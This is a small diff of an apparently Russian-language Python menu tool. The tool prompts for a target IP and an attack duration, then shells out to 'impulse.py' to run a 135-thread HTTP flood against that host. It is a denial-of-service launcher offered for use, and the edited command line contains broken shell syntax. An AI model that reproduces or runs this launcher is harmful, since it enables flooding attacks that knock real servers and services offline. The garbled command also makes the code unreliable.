@@ -158,7 +158,7 @@ sa  - - afhe
             try:
                 target=input('\nIP: ')
                 time_atack=input('время атаки в секундах: ')
-                os.system(r'python Impusle\impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
+                os.system(r'cd & cd Impusle % python impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
             except:
                 print('Ковальски, у нас ошибка.')
         else:
@@ -178,16 +178,4 @@ except:
         a_1()
     elif renable=='n' or renable=='no' or renable=='н' or renable=='нет':
         print('voron закрыт.')
-
-
-
-
-
-
-
-
-
-
-
-
 
